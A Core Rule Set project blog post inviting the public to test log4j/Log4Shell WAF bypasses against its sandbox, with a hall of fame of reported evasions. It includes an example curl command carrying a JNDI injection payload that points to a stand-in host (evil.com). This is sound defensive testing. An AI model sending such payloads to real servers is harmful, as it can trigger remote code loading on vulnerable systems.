---
author: dune73
categories:
  - Blog
date: '2021-12-16T13:01:59+01:00'
guid: https://coreruleset.org/?p=1564
permalink: /20211216/public-hunt-for-log4j-log4shell-evasions-waf-bypasses/
title: Public Hunt for log4j / log4shell Evasions / WAF Bypasses
url: /2021/12/16/public-hunt-for-log4j-log4shell-evasions-waf-bypasses/
---


We have been updating our detection for the infamous CVE-2021-44228 vulnerability and its siblings for several days now. With the new experimental rule 1005, we think we really have decent detection capabilities now. Read up on this development in the separate blog post [CRS and Log4j / Log4Shell / CVE-2021-44228](https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/).  
  
Right before the log4j CVE was published, we took up our [CRS Sandbox](https://coreruleset.org/20211209/introducing-the-crs-sandbox/) that lets you test payloads against various CRS installations.  
  
We have now combined the [](https://coreruleset.org/20211209/introducing-the-crs-sandbox/)CRS Sandbox and the log4j detection to give you access to a live system with our new rule 1005 (and the expanded 932130). Successful bypasses will be listed in the Hall-of-Fame below.

#### How test my bypass?

```
<pre class="wp-block-preformatted">$ curl -H 'x-crs-version: 3.4.0-dev-log4j' -H 'x-format-output: txt-matched-rules' -H 'User-Agent: ${jndi:ldap://evil.com/webshell}' https://sandbox.coreruleset.org/
```

The important bit is the custom HTTP header `x-crs-version: 3.4.0-dev-log4j`:[ ](<x-crs-version: 3.4.0-dev-log4j>)With this version string you get onto our new instance that carries the latest versions of the log4j attack detection. The other instances are vanilla CRS tags. They won't get the new rules / capabilities until we do a new release (and given we're usually not add new rules to existing stable releases in order to avoid introducing new false positives, this won't be anytime soon).

#### Rules to get into the Hall-of-Fame

You need to do three things:

- You need to pull off a bypass against the sandbox.
- You need to tell us about the bypass by submitting your payload via mail to security at coreruleset.org.
- You need to declare that this is in fact a working exploit.

We do not have the capacity to determine whether bypasses actually work as an exploit against log4j. So we kind of need to take your word for it.

If somebody in the community has the knowledge and the capacity to support us with this discussion, then please get in touch.

#### Hall-of-Fame

- Dominik Strecker, Syracom Schweiz AG : *Bypass via an XML attribute due to broken XPath selector in our rule 1005.*

##### Honorary mentions

- *Denis Augsburger ([@denisaugsburger](https://twitter.com/denisaugsburger)), TWTeam Switzerland : Bypass of rule 1005 with a spectacular evasion, that was detected by extended rule 932130*
- *Matej Sustr, Slovakia: Bypass of rule 1005 with an alternative evasion to Denis Augsburger's bypass, also detected by rule 932130*.
- *Matej Sustr, Slovakia: Bypass of rule set with an interesting evasion that depends on server side decoding before hitting log4j*.

Denis Augsburger has found a way around 1005 and we might have to update the rule. The problem is that his evasion is exploiting a fundamental mis-conception of our rule. We still think we are on the safe side thanks to 932130, but investigation continues.

The 2nd bypass of Matej Sustr is also very interesting because it goes undetected entirely. It exploit a vanilla log4j, though. It takes a special use case where Java code decodes the payloads before sending it to log4j.

#### Changelog

2021-12-16 12:30 CET: Published  
2021-12-20 10:30 CET: Added Dominik Strecker to hall of fame  
2021-12-20 14:00 CET: Added Syracom Schweiz AG to Dominik's name  
2021-12-23 16:40 CET: Added Denis Augsburger, TWTeam, under Honorary mentions  
2022-01-07 14:30 CET: Added Matej Sustr under Honorary mentions
